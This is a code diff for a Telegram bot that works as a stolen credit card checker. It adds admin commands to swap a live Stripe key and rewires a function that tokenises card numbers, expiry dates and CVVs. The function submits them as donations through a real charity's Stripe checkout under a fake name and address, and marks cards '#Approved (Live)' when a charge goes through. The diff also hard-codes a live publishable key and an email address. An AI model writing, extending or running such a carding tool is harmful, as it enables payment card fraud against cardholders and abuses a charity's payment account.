@@ -16,6 +16,22 @@ if not BOT_TOKEN:
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 app = Flask(__name__)
 
+# --- Dynamic Stripe Key Management ---
+STRIPE_KEY_FILE = "stripe_key.txt"
+DEFAULT_STRIPE_KEY = "pk_live_ENpCAEI7OOkqeDauRnZvxTpX"
+
+def get_stripe_key():
+    if os.path.exists(STRIPE_KEY_FILE):
+        with open(STRIPE_KEY_FILE, "r") as f:
+            key = f.read().strip()
+            if key.startswith("pk_live_"):
+                return key
+    return DEFAULT_STRIPE_KEY
+
+def save_stripe_key(key):
+    with open(STRIPE_KEY_FILE, "w") as f:
+        f.write(key)
+
 # --- Tracking All Users ---
 ALL_USERS = set()
 ALL_USERS_FILE = "all_users.txt"
@@ -80,6 +96,23 @@ def cmd_start(message):
     bot.reply_to(message, "🛠 <b>Bot Main Menu</b>\nအောက်ပါ ခလုတ်များကို နှိပ်၍ အသုံးပြုပါ။ Gen နှင့် Address သည် Format မှန်က တန်းပို့နိုင်သည်။", reply_markup=get_main_menu())
 
 # --- Admin Commands ---
+@bot.message_handler(commands=['setkey'])
+def cmd_setkey(message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        parts = message.text.split(maxsplit=1)
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ <b>အသုံးပြုနည်း:</b> <code>/setkey pk_live_...</code>")
+            return
+        new_key = parts[1].strip()
+        if not new_key.startswith("pk_live_"):
+            bot.reply_to(message, "❌ Key ပုံစံ မှားနေပါသည် (`pk_live_` ဖြင့် စတင်ရပါမည်)။")
+            return
+        save_stripe_key(new_key)
+        bot.reply_to(message, f"✅ <b>Stripe Key အသစ်ကို အောင်မြင်စွာ ပြောင်းလဲသိမ်းဆည်းပြီးပါပြီ!</b>\n<code>{new_key}</code>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {e}")
+
 @bot.message_handler(commands=['ban'])
 def cmd_ban(message):
     if message.from_user.id != ADMIN_ID: return
@@ -126,6 +159,19 @@ def cmd_users_list(message):
     users_str = "\n".join([f"<code>{u}</code>" for u in display_users])
     bot.reply_to(message, f"👥 <b>Total Bot Users:</b> <code>{total}</code>\n\n{users_str}")
 
+@bot.message_handler(commands=['cmd', 'help'])
+def cmd_admin_menu(message):
+    if message.from_user.id != ADMIN_ID: return 
+    text = (
+        "🛠 <b>Admin Commands List</b>\n\n"
+        "🔑 /setkey pk_live_... - Change Stripe Key\n"
+        "👥 /users - Show All Users\n"
+        "🚫 /ban - Ban User\n"
+        "✅ /unban - Unban User\n"
+        "🛑 /banned - Banned List"
+    )
+    bot.reply_to(message, text, reply_markup=get_main_menu())
+
 # --- Direct Functions for Info & CPF ---
 def cmd_me(message):
     user = message.from_user
@@ -150,7 +196,7 @@ def cmd_cpf(message):
     )
     bot.reply_to(message, text, reply_markup=get_main_menu())
 
-# --- CC Checker & Binlist Logic (With Detailed Response Debugging) ---
+# --- CC Checker & Binlist Logic (Using Dynamic Key) ---
 def check_bin(cc):
     bin_num = cc[:6]
     bin_data = {"banco": "Unknown", "pais": "Unknown", "nivel": "Unknown", "type": "Unknown"}
@@ -171,18 +217,19 @@ def check_card(cc, mes, ano, cvv):
     bin_info = check_bin(cc)
     bin_text = f"{bin_info['type']}({bin_info['banco']}-{bin_info['nivel']})"
     
+    current_live_key = get_stripe_key() # ယူသုံးမည့် Stripe Key အသစ် (Dynamic)
+    
     token_url = 'https://api.stripe.com/v1/tokens'
     token_headers = {
         'Content-Type': 'application/x-www-form-urlencoded',
         'User-Agent': 'Mozilla/5.0'
     }
-    token_payload = f"email=abhiyanqwe%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout&referrer=https%3A%2F%2Fromero.mercycommunity.org.au%2Fdonate%2F&pasted_fields=number&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}&card[name]=Texa+LOl&card[address_line1]=4283+Express+Lane&card[address_city]=sarasota&card[address_state]=FL&card[address_zip]=34249&card[address_country]=United+States&time_on_page=62202&key=pk_live_ENpCAEI7OOkqeDauRnZvxTpX"
+    token_payload = f"email=abhiyanqwe%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout&referrer=https%3A%2F%2Fromero.mercycommunity.org.au%2Fdonate%2F&pasted_fields=number&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}&card[name]=Texa+LOl&card[address_line1]=4283+Express+Lane&card[address_city]=sarasota&card[address_state]=FL&card[address_zip]=34249&card[address_country]=United+States&time_on_page=62202&key={current_live_key}"
 
     try:
         req_token = requests.post(token_url, headers=token_headers, data=token_payload, timeout=10)
         token_res = req_token.text
         
-        # Check if Token generation failed (e.g. Invalid Key)
         if "error" in token_res.lower():
             return f"⚠️ <b>Stripe Key Error / Dead Key:</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Raw:</b> <code>{token_res[:100]}</code>\n<b>By:</b> @Ren2512"
 
@@ -200,7 +247,6 @@ def check_card(cc, mes, ano, cvv):
         req_charge = requests.post(donate_url, headers=donate_headers, data=donate_payload, timeout=10)
         charge_res = req_charge.text
 
-        # Success / Approved criteria
         if any(x in charge_res.lower() for x in ["success", "thank", "approved", "completed", "charge"]):
             return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         elif "Your card's security code is incorrect." in charge_res or "security code" in charge_res.lower():
